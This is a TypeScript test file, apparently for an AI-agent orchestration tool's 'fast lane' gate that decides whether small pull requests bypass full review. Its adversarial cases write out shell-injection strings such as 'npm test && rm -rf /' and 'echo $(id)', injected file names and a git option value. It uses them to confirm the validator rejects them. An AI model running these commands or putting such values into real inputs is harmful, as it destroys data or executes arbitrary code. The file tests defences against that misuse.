import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync, spawn, spawnSync } from 'node:child_process';
import { chmodSync, copyFileSync, existsSync, mkdirSync, readFileSync, readdirSync, rmSync, symlinkSync, utimesSync, writeFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { parseConf } from '../lib/conf.ts';
import {
  CODE_TYPES, FILE_TYPES, RULE_REASONS, assertService, commandWords, contentFinding, decide, decideLane, fastSettings, fileTypeOk, globMatcher, judgeDiff, lanesMedian, measureTicket,
  median, openingDecision, openingFor, openingLane, pathFormOk, sharedIdentity, targetedArgv,
} from '../lib/fast-lane.ts';
import { GithubTracker } from '../lib/tracker/adapters/github.ts';
import { LocalTracker } from '../lib/tracker/adapters/local.ts';
import { fileURLToPath } from 'node:url';
import { route } from '../lib/route.ts';
import { addEvent, openLedger } from '../lib/ledger.ts';
import { activeRelease } from '../lib/release.ts';
import { finishedReviews } from '../lib/reviews.ts';
import { sandbox, scratch, task } from './support.ts';
import type { Conf } from '../lib/conf.ts';
import type { boardCollector as collectorOf } from '../lib/board-collector.ts';

type Files = Record<string, string>;
type Git = (...args: string[]) => string;
type Change = (made: { write: (more: Files) => void; git: Git; dir: string }) => unknown;
type Project = ReturnType<typeof project>;
type LaneRecord = Parameters<typeof decideLane>[0]['record'];
type Actor = { kind: string; id: string };
// What these tests read of the board's snapshot, beyond the fields its type names.
type BoardView = Awaited<ReturnType<ReturnType<typeof collectorOf>['snapshot']>>
  & { details: Record<string, { lane: string }>; stats: { lanes: unknown }; landed: Record<string, unknown>[] };

// ---- A project with a base and a branch, and the settings of its main checkout ----

const confOf = (fast: string, extra = '') => parseConf(`[lanes]\nbase = main\n[merge]\nguarded_paths = ops/cleared/, compose\n[release]\nmigration_paths = db/schema\n[fast_lane]\n${fast}\n${extra}`);
// What the project declares safe: its texts, its translations, its styles.
const CONF = confOf('enabled = yes\nlabels = Quick\nprojects = Wording\nsafe_paths = docs/, web/locales/*.json, **/*.css\nnever_paths = docs/security/\nmax_lines = 10\nmax_files = 5\ntests_command = node --test {files}');
// Everything declared safe: only the rules no setting can widen are left (a dotfile at the root is named: "**" never takes one).
const WIDE = confOf('enabled = yes\nsafe_paths = **, .*\nmax_lines = 400\nmax_files = 50');
const write = (dir: string, files: Files) => {
  for (const [path, text] of Object.entries(files)) {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), text);
  }
};
function project(files: Files = { 'docs/guide.md': 'Hello\n', 'api/server.js': 'export const x = 1;\n', 'package.json': '{}\n', 'web/locales/en.json': '{"title": "Hello"}\n' }) {
  const dir = scratch('fast-lane-repo-');
  const git: Git = (...args) => execFileSync('git', ['-C', dir, '-c', 'user.name=t', '-c', 'user.email=t@localhost', ...args], { encoding: 'utf8' });
  git('init', '-q', '-b', 'main');
  write(dir, files);
  git('add', '-A');
  git('commit', '-q', '-m', 'base');
  git('checkout', '-q', '-b', 'dev/X-1');
  // One commit of the team: what `change` leaves in the worktree, as it is.
  const commit = (change: Change) => {
    if (change({ write: (more) => write(dir, more), git, dir }) !== 'staged') git('add', '-A');
    git('commit', '-q', '--allow-empty', '-m', 'fast-lane: yes, this is a tiny safe change');
    return git('rev-parse', 'HEAD').trim();
  };
  return { dir, git, commit };
}
const OPENED = { fast_lane: { opening: 'fast', state: 'fast' } };
const judge = (p: Project, head: string, conf = CONF, record: LaneRecord = OPENED) => decideLane({ conf, repo: p.dir, base: 'main', commit: head, record });

test('the rules: a small text change in the safe paths stays on the fast lane; a path outside them, a migration or a dependency sends it to the full circuit', () => {
  const p = project();
  const safe = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n', 'web/locales/en.json': '{"title": "Hello there"}\n', 'web/app.css': 'h1 { color: red; }\n' }));
  assert.deepEqual({ state: judge(p, safe).state, reasons: judge(p, safe).reasons }, { state: 'fast', reasons: [] });
  const outside = p.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 2;\n' }));
  assert.equal(judge(p, outside).state, 'full');
  assert.deepEqual(judge(p, outside).reasons, ['outside_safe', 'file_type'], 'outside the safe list, and code');
  assert.equal(judge(p, outside).offending!.outside_safe, 'api/server.js');
  // With everything declared safe, a migration and a dependency still never are.
  const migrations = project();
  const sql = migrations.commit(({ write: w }) => w({ 'db/migrations/0042_add_column.sql': 'ALTER TABLE t ADD c int;\n' }));
  assert.deepEqual(judge(migrations, sql, WIDE).reasons, ['migration', 'file_type']);
  const declared = project();
  const schema = declared.commit(({ write: w }) => w({ 'db/schema/users.txt': 'users\n' }));
  assert.deepEqual(judge(declared, schema, WIDE).reasons, ['migration'], '[release] migration_paths count too');
  for (const file of ['package.json', 'web/package-lock.json', 'web/yarn.lock', 'requirements-dev.txt', 'Cargo.lock', 'go.sum', '.npmrc']) {
    const deps = project();
    const head = deps.commit(({ write: w }) => w({ [file]: '{"dependencies": {"left-pad": "1.0.0"}}\n' }));
    // Refused as a dependency whatever its type; a type the fast lane does not take is said too.
    assert.deepEqual(judge(deps, head, WIDE).reasons, /\.(?:json|txt)$/.test(file) ? ['dependency'] : ['dependency', 'file_type'], file);
  }
  const extra = project();
  const pinned = extra.commit(({ write: w }) => w({ 'tools/versions.txt': 'node 24\n' }));
  assert.deepEqual(judge(extra, pinned, confOf('enabled = yes\nsafe_paths = **\ndependency_files = tools/versions.txt')).reasons, ['dependency']);
  // And the project's own never list wins over its safe list.
  const never = project();
  const secured = never.commit(({ write: w }) => w({ 'docs/security/policy.md': 'all open\n' }));
  assert.deepEqual(judge(never, secured).reasons, ['protected']);
});

test('a dotfile or a dot directory is matched only by a pattern that names a dot: docs/.htaccess, docs/.env and docs/.eslintrc are not fast under docs/', () => {
  const under = globMatcher('docs/');
  for (const path of ['docs/.htaccess', 'docs/.env', 'docs/.eslintrc', 'docs/a/.env', 'docs/.well-known/x.txt']) assert.equal(under(path), false, path);
  assert.equal(under('docs/guide.md'), true);
  assert.equal(globMatcher('**')('.env'), false);
  assert.equal(globMatcher('**/*.css')('web/.x/a.css'), false);
  assert.equal(globMatcher('**/*.css')('web/a.css'), true);
  assert.equal(globMatcher('*/.*')('docs/.env'), true, 'a pattern that names the dot takes it');
  assert.equal(globMatcher('.well-known/*')('.well-known/x.txt'), true);
  assert.equal(globMatcher('docs/*')('docs/.env'), false);
  const p = project({ 'docs/guide.md': 'Hello\n', 'docs/.htaccess': 'deny\n' });
  const head = p.commit(({ write: w }) => w({ 'docs/.htaccess': 'allow\n', 'docs/.env': 'K=1\n', 'docs/.eslintrc': '{}\n' }));
  assert.deepEqual(judge(p, head).reasons, ['outside_safe', 'file_type'], 'and a dotfile is no file type the fast lane takes');
  assert.equal(judge(p, head).offending!.outside_safe, 'docs/.env', 'the first dotfile is named, never a line of it');
});

test('an unknown [fast_lane] key is refused, not ignored: the fast lane is off for the ticket, and the problem is named', () => {
  const typo = confOf('enabled = yes\nsafe_paths = docs/\nnever_path = docs/security/');
  assert.throws(() => fastSettings(typo), /\[fast_lane\] unknown key "never_path"/);
  const p = project();
  const head = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n' }));
  const judged = judge(p, head, typo);
  assert.equal(judged.state, 'full');
  assert.deepEqual(judged.reasons, ['settings']);
  assert.match(judged.problem!, /unknown key "never_path"/);
  assert.equal(judge(p, head, CONF).state, 'fast', 'the same change with the key spelled right is fast');
});

test('adversarial: a pull request that widens its own safe paths in .cleared/agents.conf is never fast, and the settings are those of the main checkout', () => {
  const p = project({ 'docs/guide.md': 'Hello\n', '.cleared/agents.conf': '[fast_lane]\nenabled = yes\nsafe_paths = docs/\n' });
  const head = p.commit(({ write: w }) => w({ '.cleared/agents.conf': '[fast_lane]\nenabled = yes\nsafe_paths = **\nmax_lines = 9999\n', 'docs/guide.md': 'Hi\n' }));
  // The main checkout's settings say docs/ only: the branch's own file widens nothing.
  const judged = judge(p, head);
  assert.equal(judged.state, 'full');
  assert.ok(judged.reasons.includes('protected'));
  // Even a main checkout that declared everything safe keeps Cleared's settings, CI, agent rules and git files apart.
  for (const file of ['.cleared/agents.conf', '.cleared/prompts/dev.md', '.github/workflows/ci.yml', '.Cleared/agents.conf', 'sub/.cleared/x', 'CLAUDE.md', 'docs/AGENTS.md',
    '.gitattributes', 'docs/.gitmodules', '.husky/pre-commit', 'ops/cleared/merge-pr.sh', 'OPS/Cleared/merge-pr.sh', 'compose.yaml', 'Dockerfile', 'CODEOWNERS',
    'deploy/Dockerfile.web', 'deploy/docker-compose.prod.yml', 'deploy/compose.staging.yaml', 'web/app.dockerfile']) {
    const one = project();
    const changed = one.commit(({ write: w }) => w({ [file]: 'changed\n' }));
    assert.ok(judge(one, changed, WIDE).reasons.includes('protected'), file);
  }
});

test('adversarial: path tricks (unicode, look-alikes, case, option-like and spaced names) take the full circuit', () => {
  for (const file of ['docs/café.md', 'docs/café.md', 'docs/guіde.md', 'docs/-rf.md', 'docs/a b.md', 'docs/semi;colon.md', 'docs/$(touch x).md']) {
    const p = project();
    const head = p.commit(({ write: w }) => w({ [file]: 'text\n' }));
    assert.deepEqual(judge(p, head).reasons, ['path_form'], JSON.stringify(file));
  }
  const twins = project();
  const both = twins.commit(({ write: w }) => w({ 'docs/Read.md': 'one\n', 'docs/read.md': 'two\n' }));
  assert.deepEqual(judge(twins, both).reasons, ['path_form']);
  // A safe list is matched as written: another case is outside it.
  const upper = project();
  const shouted = upper.commit(({ write: w }) => w({ 'DOCS/guide.md': 'text\n' }));
  assert.deepEqual(judge(upper, shouted).reasons, ['outside_safe']);
  for (const bad of ['', '/abs', 'a//b', './a', 'a/./b', 'a/../b', '..', 'a\\b', 'a\nb', '-x', 'a/-x', '@x.md', 'docs/@scope/a.md']) assert.equal(pathFormOk(bad), false, JSON.stringify(bad));
  assert.equal(pathFormOk('docs/.well-known/x.md'), true);
});

test('adversarial: a rename, a deletion, a symbolic link, an executable, a binary file, a submodule or a file deleted and recreated as something else is not judged fast', () => {
  const cases: Record<string, Change> = {
    rename: ({ git }) => git('mv', 'docs/guide.md', 'docs/manual.md'),
    deletion: ({ git }) => git('rm', '-q', 'docs/guide.md'),
    symlink: ({ dir }) => symlinkSync('../api/server.js', join(dir, 'docs', 'link.md')),
    executable: ({ dir }) => chmodSync(join(dir, 'docs', 'guide.md'), 0o755),
    binary: ({ write: w }) => w({ 'docs/data.md': 'a\0b\0c' }),
    submodule: ({ git }) => { git('update-index', '--add', '--cacheinfo', `160000,${git('rev-parse', 'HEAD').trim()},docs/sub`); return 'staged'; },
  };
  for (const [name, change] of Object.entries(cases)) {
    const p = project();
    const head = p.commit(change);
    const judged = judge(p, head);
    assert.equal(judged.state, 'full', name);
    assert.ok(judged.reasons.includes(name === 'binary' ? 'binary' : 'unusual_change'), `${name}: ${judged.reasons}`);
  }
  // Deleted in one commit, recreated as a link in the next: the diff of the branch is a change of type.
  const p = project();
  p.commit(({ git }) => git('rm', '-q', 'docs/guide.md'));
  const head = p.commit(({ dir }) => { mkdirSync(join(dir, 'docs'), { recursive: true }); symlinkSync('../api/server.js', join(dir, 'docs', 'guide.md')); });
  assert.ok(judge(p, head).reasons.includes('unusual_change'));
  // A change git cannot read is never fast.
  assert.deepEqual(judge(p, 'no-such-commit').reasons, ['unreadable']);
  assert.deepEqual(judge(p, '--output=/tmp/x').reasons, ['unreadable']);
});

test('the line threshold is inclusive; more files, a larger file, or an empty change take the full circuit', () => {
  const ten = project();
  const exactly = ten.commit(({ write: w }) => w({ 'docs/new.md': `${Array.from({ length: 10 }, (_, i) => `line ${i}`).join('\n')}\n` }));
  assert.equal(judge(ten, exactly).state, 'fast');
  assert.equal(judge(ten, exactly).lines, 10);
  const eleven = project();
  const over = eleven.commit(({ write: w }) => w({ 'docs/new.md': `${Array.from({ length: 11 }, (_, i) => `line ${i}`).join('\n')}\n` }));
  assert.deepEqual(judge(eleven, over).reasons, ['too_many_lines']);
  // Removed lines count too: one changed line is one removed and one added.
  const both = project();
  const changed = both.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n' }));
  assert.equal(judge(both, changed).lines, 2);
  const many = project();
  const six = many.commit(({ write: w }) => w(Object.fromEntries(Array.from({ length: 6 }, (_, i) => [`docs/f${i}.md`, 'x\n']))));
  assert.deepEqual(judge(many, six).reasons, ['too_many_files']);
  const big = project();
  const large = big.commit(({ write: w }) => w({ 'docs/long.md': `${'x'.repeat(100001)}` }));
  assert.deepEqual(judge(big, large, confOf('enabled = yes\nsafe_paths = docs/')).reasons, ['too_large']);
  const empty = project();
  assert.deepEqual(judge(empty, empty.commit(() => {})).reasons, ['empty']);
});

test('the decision is bound to the commit: a later push is judged again, a ticket sent back stays in the full circuit, and the lead is told', () => {
  const p = project();
  const state = scratch('fast-lane-state-');
  mkdirSync(join(state, 'lanes'), { recursive: true });
  const saved = { state: process.env.ORCH_STATE_DIR, ledger: process.env.ORCH_LEDGER };
  process.env.ORCH_STATE_DIR = state;
  process.env.ORCH_LEDGER = join(state, 'ledger.db');
  try {
    writeFileSync(join(state, 'lanes', 'X-1.json'), JSON.stringify({ ticket: 'X-1', pr: 41, ...OPENED }));
    const record = () => JSON.parse(readFileSync(join(state, 'lanes', 'X-1.json'), 'utf8')).fast_lane;
    const events = () => { const db = openLedger(); const rows = db.prepare("SELECT kind, detail FROM events WHERE kind LIKE 'fast_lane_%' ORDER BY event_id").all() as { kind: string; detail: string }[]; db.close(); return rows; };
    const first = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n' }));
    assert.equal(decide('X-1', first, { conf: CONF, repo: p.dir }).state, 'fast');
    assert.equal(record().head, first);
    assert.deepEqual(events().map((e) => e.kind), ['fast_lane_kept']);
    // The same commit again: nothing new to say.
    decide('X-1', first, { conf: CONF, repo: p.dir });
    assert.equal(events().length, 1);
    // Eligible at one commit, extended at the next: judged again, and sent back.
    const extended = p.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 2;\n' }));
    assert.equal(decide('X-1', extended, { conf: CONF, repo: p.dir }).state, 'full');
    assert.deepEqual({ state: record().state, head: record().head, reasons: record().reasons }, { state: 'full', head: extended, reasons: ['outside_safe', 'file_type'] });
    const fallback = events().at(-1)!;
    assert.equal(fallback.kind, 'fast_lane_fallback');
    assert.match(JSON.parse(fallback.detail).first, /outside_safe: api\/server\.js/);
    // Taking the unsafe file back out does not bring it back to the fast lane, and neither does the first commit.
    const undone = p.commit(({ git }) => git('checkout', '-q', 'main', '--', 'api/server.js'));
    assert.equal(decide('X-1', undone, { conf: CONF, repo: p.dir }).state, 'full');
    assert.equal(decide('X-1', first, { conf: CONF, repo: p.dir }).state, 'full');
    assert.equal(events().filter((e) => e.kind === 'fast_lane_fallback').length, 1, 'said once');
    // A git that cannot answer now gives the full circuit for that call, and sends nothing back for good.
    writeFileSync(join(state, 'lanes', 'X-2.json'), JSON.stringify({ ticket: 'X-2', ...OPENED }));
    assert.equal(decide('X-2', 'no-such-commit', { conf: CONF, repo: p.dir }).state, 'full');
    assert.equal(JSON.parse(readFileSync(join(state, 'lanes', 'X-2.json'), 'utf8')).fast_lane.state, 'fast');
  } finally {
    if (saved.state === undefined) delete process.env.ORCH_STATE_DIR; else process.env.ORCH_STATE_DIR = saved.state;
    if (saved.ledger === undefined) delete process.env.ORCH_LEDGER; else process.env.ORCH_LEDGER = saved.ledger;
  }
});

test('adversarial: the flag cannot be forged: another account cannot decide, a forged record buys nothing, and nothing an agent writes is read', () => {
  assert.throws(() => assertService({ uid: 1001, owner: 1000 }), /only the service account/);
  assert.doesNotThrow(() => assertService({ uid: 1000, owner: 1000 }));
  const p = project();
  // A record that says fast, at a commit whose diff is not: the rules read the diff again.
  const unsafe = p.commit(({ write: w }) => w({ 'api/server.js': 'export const x = 2;\n' }));
  assert.equal(judge(p, unsafe, CONF, { fast_lane: { opening: 'fast', state: 'fast', head: unsafe, reasons: [] } }).state, 'full');
  // A safe diff, a commit message, a report or a file that claims the fast lane: without the opening the rules wrote, no.
  const claimed = project();
  const head = claimed.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n', 'docs/FAST_LANE': 'state: fast\n' }));
  for (const record of [null, {}, { fast_lane: { state: 'fast' } }, { fast_lane: { opening: 'full', state: 'fast' } }] as LaneRecord[]) {
    assert.equal(judge(claimed, head, CONF, record).state, 'full', JSON.stringify(record));
  }
  // The command line refuses an account other than the owner of the state before it reads anything.
  const state = scratch('fast-lane-owner-');
  const as = spawnSync(process.execPath, ['-e', `import('${join(import.meta.dirname, '..', 'lib', 'fast-lane.ts')}').then((m) => { try { m.assertService({ uid: process.getuid() + 1 }); } catch (e) { console.log(e.message); } })`],
    { env: { ...process.env, ORCH_STATE_DIR: state }, encoding: 'utf8' });
  assert.match(as.stdout, /only the service account decides/);
});

test('the targeted tests run with no shell: {files} becomes one argument per changed file, and no file name can inject anything', () => {
  assert.deepEqual(commandWords('npx --no-install vitest related --run {files}'), ['npx', '--no-install', 'vitest', 'related', '--run', '{files}']);
  assert.deepEqual(commandWords(`node "--test-name-pattern=a b" {files}`), ['node', '--test-name-pattern=a b', '{files}']);
  assert.deepEqual(targetedArgv('node --test {files}', ['docs/a.md', 'web/b.css']), ['node', '--test', 'docs/a.md', 'web/b.css']);
  for (const bad of ['npm test; curl x', 'npm test && rm -rf /', 'npm test | tee x', 'echo $(id) {files}', 'echo `id` {files}', 'cat < x {files}', 'npm test {files} {files}', 'npm test --files={files}', '{files}', 'npm test', 'npm "test {files}']) {
    assert.throws(() => commandWords(bad), /tests_command/, bad);
  }
  for (const file of ['-rf', '@list.txt', 'docs/@list.txt', 'docs/$(id).md', 'docs/a b.md', 'docs/;rm.md', '../x', '']) assert.throws(() => targetedArgv('node --test {files}', [file]), /cannot be handed/, file);
  // Run for real: the words go to the program as they are, nothing is interpreted.
  const out = spawnSync(process.execPath, ['-e', 'console.log(JSON.stringify(process.argv.slice(1)))', ...targetedArgv('x {files}', ['docs/a.md']).slice(1)], { encoding: 'utf8' });
  assert.deepEqual(JSON.parse(out.stdout), ['docs/a.md']);
});

test('the settings: unreadable patterns or numbers make nothing fast; empty safe paths make nothing fast; off is off; the opening reads the ticket', () => {
  for (const bad of ['safe_paths = docs/{a,b}/', 'safe_paths = docs/[ab].md', 'safe_paths = !docs/', 'safe_paths = /etc/', 'safe_paths = docs/**x', 'safe_paths = ../x', 'max_lines = ten', 'max_lines = 0', 'tests_command = npm test; id']) {
    assert.throws(() => fastSettings(confOf(`enabled = yes\n${bad}`)), /\[fast_lane\]/, bad);
  }
  const p = project();
  const head = p.commit(({ write: w }) => w({ 'docs/guide.md': 'Hello, world\n' }));
  assert.deepEqual(judge(p, head, confOf('enabled = yes\nsafe_paths = docs/{a,b}/')).reasons, ['settings']);
  assert.deepEqual(judge(p, head, confOf('enabled = yes')).reasons, ['outside_safe']);
  assert.deepEqual(judge(p, head, confOf('enabled = no\nsafe_paths = docs/')).reasons, ['disabled']);
  const settings = fastSettings(CONF);
  const human = { kind: 'human', id: 'alice' };
  assert.equal(openingLane(settings, { labels: ['Bug', 'Quick'], project: null }, { labels: { Bug: human, Quick: human }, project: null }), 'fast');
  assert.equal(openingLane(settings, { labels: [], project: 'Wording' }, { labels: {}, project: human }), 'fast');
  assert.equal(openingLane(settings, { labels: ['quick'], project: 'Other' }), 'full', 'a label is matched as the project writes it');
  assert.equal(openingLane(fastSettings(confOf('enabled = no\nlabels = Quick')), { labels: ['Quick'] }), 'full');
  const glob = globMatcher('web/**/*.css');
  assert.deepEqual(['web/a.css', 'web/x/y/a.css', 'web/a.scss', 'web/a.css/x', 'app/web/a.css'].map(glob), [true, true, false, false, false]);
  assert.deepEqual(['docs/a', 'docs/x/y', 'docs', 'docsx/a'].map(globMatcher('docs/')), [true, true, false, false]);
  assert.deepEqual(RULE_REASONS.includes('asked'), true);
});

test('routing: the fast lane picks the light author and a light reviewer that still differs from the author', () => {
  const conf = parseConf(`[models]\nheavy = claude:opus\nlight = claude:haiku\nmid = claude:sonnet\n[fallbacks]\n[roles]\ndev = heavy\nreview = heavy\n[rules]\ndev label=Bug -> heavy\n[review]\ndiffers_from_author = yes\nwhen_same = mid\n[fast_lane]\nauthor_model = light\nreview_model = light\n`);
  assert.equal(route(conf, task({ labels: ['Bug'] })).chain[0]!.alias, 'heavy');
  const fast = route(conf, task({ labels: ['Bug'], lane: 'fast' }));
  assert.equal(fast.chain[0]!.alias, 'light');
  assert.match(fast.rule, /fast lane: light author/);
  // A light reviewer that is the author's own model is replaced, as for any review.
  const review = route(conf, task({ role: 'review', lane: 'fast', authorModel: 'haiku' }));
  assert.equal(review.chain[0]!.alias, 'mid');
  assert.equal(route(conf, task({ role: 'review', lane: 'fast', authorModel: 'opus' })).chain[0]!.alias, 'light');
  // A model named at launch is not second-guessed; another role is not concerned.
  assert.equal(route(conf, task({ lane: 'fast', forced: 'heavy' })).chain[0]!.alias, 'heavy');
  assert.equal(route(conf, task({ role: 'review', authorModel: 'haiku' })).chain[0]!.alias, 'heavy');
});

test('measurement: working time is the union of the sessions, the human waits from the notification (else the card) to his gesture, the machine the rest; medians by lane', () => {
  const at = (minutes: number) => new Date(Date.UTC(2026, 9, 15, 10, minutes)).toISOString();
  const runs = [{ started_at: at(1), ended_at: at(5) }, { started_at: at(4), ended_at: at(6) }, { started_at: at(8), ended_at: at(9) }];
  assert.deepEqual(measureTicket({ todoAt: at(0), doneAt: at(15), runs, cardAt: at(9), notifiedAt: at(10), gestureAt: at(12) }),
    { total: 15, working: 6, humanWait: 2, machineWait: 7, humanFrom: 'notification' });
  assert.deepEqual(measureTicket({ todoAt: at(0), doneAt: at(15), runs, cardAt: at(9), notifiedAt: null, gestureAt: at(12) }),
    { total: 15, working: 6, humanWait: 3, machineWait: 6, humanFrom: 'card' });
  assert.equal(measureTicket({ todoAt: at(0), doneAt: at(15), runs, cardAt: at(9) })!.humanWait, null, 'no gesture known: not guessed');
  assert.equal(measureTicket({ todoAt: at(10), doneAt: at(5) }), null);
  assert.equal(median([5, 1, 3]), 3);
  assert.equal(median([1, 2, 3, 10]), 2.5);
  assert.equal(median([]), null);
  const db = openLedger(':memory:');
  const now = Date.parse('2026-10-15T12:00:00Z');
  for (const [lane, value, days] of [['fast', 14, 1], ['fast', 12, 2], ['fast', 30, 3], ['full', 329, 1], ['full', 100, 9]] as [string, number, number][]) {
    addEvent(db, { kind: 'ticket_measured', ticket: 'X-1', value, at: new Date(now - days * 86400e3).toISOString(), detail: JSON.stringify({ lane }) });
  }
  // 14:00 at +03:00 is 11:00 UTC, eight days back: outside the window, though its text sorts inside it.
  addEvent(db, { kind: 'ticket_measured', ticket: 'X-2', value: 999, at: '2026-10-08T14:00:00+03:00', detail: JSON.stringify({ lane: 'full' }) });
  assert.deepEqual(lanesMedian(db, { now }), { days: 7, fast: { minutes: 14, count: 3 }, full: { minutes: 329, count: 1 } });
  db.close();
});

test('the health watch of a fast-lane release holds no merge back; one of the full circuit, or a rollback at work, still does', () => {
  const db = openLedger(':memory:');
  activeRelease(db);
  const add = (id: number, status: string, lane: string | null) => db.prepare('INSERT INTO releases(id, ticket, pr, merge_sha, title, merged_at, status, lane) VALUES (?,?,?,?,?,?,?,?)').run(id, `X-${id}`, id, String(id).repeat(40).slice(0, 40), 't', '2026-10-15T10:00:00Z', status, lane);
  add(1, 'watching', 'fast');
  assert.equal(activeRelease(db), undefined);
  add(2, 'watching', null);
  assert.equal(activeRelease(db)!.id, 2, 'an older row without a lane counts as the full circuit');
  db.prepare("UPDATE releases SET status = 'complete' WHERE id = 2").run();
  db.prepare("UPDATE releases SET status = 'rolling_back' WHERE id = 1").run();
  assert.equal(activeRelease(db)!.id, 1, 'a rollback of a fast-lane release is at work: nothing goes live meanwhile');
  db.close();
});

// ---- The card and the app ----

async function board({ status = 'Needs Approval', checks = 'pending', approval = true } = {}) {
  const dir = scratch('fast-lane-board-');
  const saved = { ledger: process.env.ORCH_LEDGER, state: process.env.ORCH_STATE_DIR, cleared: process.env.CLEARED_STATE_DIR };
  process.env.ORCH_LEDGER = join(dir, 'ledger.db'); process.env.ORCH_STATE_DIR = dir; process.env.CLEARED_STATE_DIR = dir;
  const db = openLedger();
  db.exec('CREATE TABLE heartbeat_state (key TEXT PRIMARY KEY, value TEXT NOT NULL); CREATE TABLE heartbeat_incidents (id TEXT PRIMARY KEY, first_seen TEXT, last_seen TEXT, active INTEGER);');
  const ticket = { id: 'EX-7', identifier: 'EX-7', title: 'Rename the settings title', body: '', status };
  if (approval) {
    mkdirSync(join(dir, 'validations'), { recursive: true });
    writeFileSync(join(dir, 'validations', 'EX-7.json'), JSON.stringify({ ticket: 'EX-7', at: new Date(Date.now() - 300e3).toISOString(), pulls: [{ pr: 314, head: 'a'.repeat(40) }] }));
  }
  mkdirSync(join(dir, 'wake'), { recursive: true });
  writeFileSync(join(dir, 'wake', 'state.json'), JSON.stringify({ pulls: { 314: { state: 'ready', checks, files: 1, additions: 1, deletions: 1 } } }));
  db.prepare('INSERT INTO runs (run_id, ticket, role, model, provider, started_at, ended_at, outcome, pr_number) VALUES (?,?,?,?,?,?,?,?,?)')
    .run('r1-dev-a1', 'EX-7', 'dev', 'claude-haiku', 'claude', new Date(Date.now() - 900e3).toISOString(), new Date(Date.now() - 600e3).toISOString(), 'done', 314);
  const conf = { sections: { owner: { language: 'en' }, heartbeat: { wake_interval_minutes: '1' }, lanes: { push_roles: 'dev' },
    tracker: { adapter: 'github', repository: 'owner/repo', progress_state: 'In Progress', review_state: 'In Review', validate_state: 'Needs Approval', go_state: 'Ready to Ship' } } } as unknown as Conf;
  const { boardCollector } = await import('../lib/board-collector.ts');
  const trackerClient = { listTickets: ({ status: s }: { status: string }) => (s === ticket.status ? [ticket] : []), getTicket: () => ticket, comments: () => [] };
  const collect = () => boardCollector({ conf, trackerClient, fuelReader: async () => [] }).snapshot() as Promise<BoardView>;
  const close = () => {
    db.close();
    for (const [name, value] of [['ORCH_LEDGER', saved.ledger], ['ORCH_STATE_DIR', saved.state], ['CLEARED_STATE_DIR', saved.cleared]] as [string, string | undefined][]) { if (value === undefined) delete process.env[name]; else process.env[name] = value; }
  };
  return { db, dir, collect, close };
}

test('the card: Ready to land appears while the full checks run and says so; a ticket sent back says why; the app shows the median by lane', async () => {
  const b = await board();
  try {
    addEvent(b.db, { kind: 'fast_lane_opened', ticket: 'EX-7', detail: 'dev/EX-7: opened on the fast lane' });
    let snap = await b.collect();
    let card = snap.tickets[0]!;
    assert.equal(card.kind, 'ready');
    assert.equal(card.lane, 'fast');
    assert.equal(card.statusLine, 'full checks running, landing when green');
    assert.equal(snap.details['EX-7']!.lane, 'fast');
    // The checks turned green: the card is an ordinary Ready to land.
    writeFileSync(join(b.dir, 'wake', 'state.json'), JSON.stringify({ pulls: { 314: { state: 'ready', checks: 'success', files: 1, additions: 1, deletions: 1 } } }));
    snap = await b.collect();
    assert.notEqual(snap.tickets[0]!.statusLine, 'full checks running, landing when green');
    // Sent back by the rules: the card says it, with the reason in words and never the path.
    addEvent(b.db, { kind: 'fast_lane_fallback', ticket: 'EX-7', detail: JSON.stringify({ head: 'b'.repeat(40), reasons: ['outside_safe'], first: 'outside_safe: api/secret/server.js' }) });
    snap = await b.collect();
    card = snap.tickets[0]!;
    assert.equal(card.lane, 'full');
    assert.equal(card.statusLine, 'back to the full circuit: a file outside the safe list');
    assert.doesNotMatch(JSON.stringify(snap), /api\/secret/);
    // One line in the app: the median from Todo to Done over seven days, by lane; each landed ticket with its lane and times.
    addEvent(b.db, { kind: 'merged_by_script', ticket: 'EX-3', value: 12 });
    addEvent(b.db, { kind: 'ticket_measured', ticket: 'EX-3', value: 14.2, detail: JSON.stringify({ lane: 'fast', working_min: 6.1, human_wait_min: 3, machine_wait_min: 5.1 }) });
    snap = await b.collect();
    assert.deepEqual(snap.stats.lanes, { days: 7, fast: { minutes: 14.2, count: 1 }, full: { minutes: null, count: 0 } });
    assert.deepEqual((({ lane, totalMin, workingMin, humanWaitMin, machineWaitMin }) => ({ lane, totalMin, workingMin, humanWaitMin, machineWaitMin }))(snap.landed[0]!),
      { lane: 'fast', totalMin: 14, workingMin: 6, humanWaitMin: 3, machineWaitMin: 5 });
    const { validBoard } = await import('../app/sources/live.ts');
    assert.equal(validBoard(snap), true);
    assert.equal(validBoard({ ...snap, stats: { ...snap.stats, lanes: { fast: { minutes: 'x', count: 1 }, full: { minutes: null, count: 0 } } } }), false);
    const { message } = await import('../lib/i18n.ts');
    for (const code of [...RULE_REASONS, 'other']) assert.notEqual(message(`app_srv_fast_reason_${code}`, 'fr'), message(`app_srv_fast_reason_${code}`, 'en'), code);
    assert.equal(message('app_srv_fast_landing_when_green', 'fr'), 'vérifications complètes en cours, mise en ligne dès qu’elles sont vertes');
    const app = readFileSync(join(import.meta.dirname, '..', 'app', 'public', 'app.js'), 'utf8');
    assert.match(app, /app_stat_median/);
  } finally { b.close(); }
});


test('the lane record is written under its lock: a writer waits for a holder of it', async () => {
  const state = scratch('fast-lane-lock-');
  mkdirSync(join(state, 'lanes'), { recursive: true });
  const record = join(state, 'lanes', 'X-1.json');
  writeFileSync(record, JSON.stringify({ ticket: 'X-1', fast_lane: { opening: 'fast', state: 'fast' } }));
  const cli = fileURLToPath(new URL('../lib/fast-lane.ts', import.meta.url));
  const env = { ...process.env, ORCH_STATE_DIR: state, ORCH_LEDGER: join(state, 'ledger.db') };
  const started = join(state, 'holder-started');
  // The holder takes the lock, says so with a file (touch), then keeps the lock a second.
  const hold = `const fs = process.getBuiltinModule('node:fs'); const started = ${JSON.stringify(started)};
fs.closeSync(fs.openSync(started, 'a')); const now = new Date(); fs.utimesSync(started, now, now); setTimeout(() => {}, 1000);`;
